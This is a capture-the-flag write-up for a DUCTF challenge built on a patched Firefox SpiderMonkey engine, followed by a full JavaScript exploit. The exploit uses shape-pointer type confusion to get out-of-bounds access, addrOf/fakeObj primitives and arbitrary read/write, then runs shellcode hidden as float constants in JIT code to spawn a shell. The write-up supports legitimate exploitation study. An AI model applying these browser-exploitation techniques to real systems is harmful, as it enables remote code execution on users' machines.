# return to monke

## Challenge

The Firefox "SpiderMonkey" JavaScript engine, with a patch that adds a `monke` method to objects.

## Solution

The new `monke` method allows us to read and write the shape pointer of an object.
This allows for trivial type confusion.

By changing the shape of an array to the shape of an object, we can use the object properties to overwrite the length of the array.
We can then change the shape back to an array, allowing us to use the array as normal, but with an increased length, which we can use to read and write out-of-bounds.

We can use this out-of-bound access to create the addrOf primitive by writing the pointer of an object in one array, then reading the pointer to an object as a float from an overlapping array.
We can use this out-of-bound access to create the fakeObj primitive by writing the pointer to a fake object as a float in one array, then reading the value as an object from an overlapping array.

We can also use the out-of-bounds access to overwrite the backing store of a typed array, allowing us to read and write to arbitrary addresses.

This can be used to control RIP by overwriting the entrypoint of a JITed function, or overwriting the class operations of an object.
The exploit script below uses the latter approach.

Shellcode can be smuggled into executable memory as float constants in a JITed function.

By changing RIP to point at these constants, we can execute arbitrary shellcode and spawn a shell.

## Exploit

```js
const buffer = new ArrayBuffer(8);
const floatarray = new Float64Array(buffer);
const biguint64array = new BigUint64Array(buffer);

function ftoi(x) {
	floatarray[0] = x;
	return biguint64array[0];
}

function itof(x) {
	biguint64array[0] = x;
	return floatarray[0];
}

function jitme() {
	sc_marker = 5.40900888e-315;
	SC1 = 7.340387646374746e+223;
	SC2 = -5.632314578774827e+190;
	SC3 = 2.820972646004203e-134;
	SC4 = 1.7997858657482317e+204;
	SC5 = -6.038714811533287e-264;
	SC6 = 2.6348604761052688e-284;
}

for (let i = 0; i < 100000; i++) {
	jitme();
}

obj = {a: 1.1, b: 2.2};
oob_arr = new BigUint64Array(1);
addrOf_fakeObj_arr = new Array(1);
rwx_arr = new BigUint64Array(1);
rwx_uint8 = new Uint8Array(1);
oob_arr[0] = 0x41414141n;

console.log("length: ", oob_arr.length);

obj_shape = obj.monke();
arr_shape = oob_arr.monke();

oob_arr.monke(obj_shape);

oob_arr.b = itof(0xffn);

oob_arr.monke(arr_shape);

console.log("length: ", oob_arr.length);

function addrOf(x) {
	addrOf_fakeObj_arr[0] = x;
	return oob_arr[10] & 0x7fffffffffffn;
}

function fakeObj(x) {
	oob_arr[10] = x;
	return addrOf_fakeObj_arr[0];
}

function arb_read(addr) {
	oob_arr[19] = addr;
	return rwx_arr[0];
}

function arb_write(addr, value) {
	oob_arr[19] = addr;
	rwx_arr[0] = value;
}

function arb_read_len(addr, len) {
	oob_arr[29] = BigInt(len);
	oob_arr[31] = addr;
	return rwx_uint8;
}

console.log("oob_arr: ", addrOf(oob_arr).toString(16));

code = arb_read(arb_read(addrOf(jitme) + 0x28n));

sc_start = -1;
for (let i = 0; i < 1000; i++) {
	sc_start = code + BigInt(8 * i);
	check = arb_read(sc_start);
	if (check == 0x41414141n) {
		sc_start += 0x8n;
		break;
	}
}

console.log("stage1: ", sc_start.toString(16));

target = new Uint8Array(1);
target_shape = arb_read(addrOf(target));
target_group = arb_read(target_shape);
target_class = arb_read(target_group);

fake_group = new Uint8Array(0x40);
fake_group.set(arb_read_len(target_group, fake_group.length));

fake_class = new Uint8Array(0x40);
fake_class.set(arb_read_len(target_class, fake_class.length));

fake_cOps = new Uint8Array(0x40);

arb_write(addrOf(fake_cOps) + 0x38n, sc_start);
arb_write(addrOf(fake_class) + 0x38n + 0x10n, addrOf(fake_cOps) + 0x38n);
arb_write(addrOf(fake_group) + 0x38n, addrOf(fake_class) + 0x38n);
arb_write(target_shape, addrOf(fake_group) + 0x38n);

console.log("target: " ,addrOf(target).toString(16));

target.a = 1;
```

## Flag

```
DUCTF{y0uVe_r3tuRn3d_to_m0nkE_nOW_reJ3ct_hUm4Nity_593767de9bb04d4520804ef68fbacd2a}
```
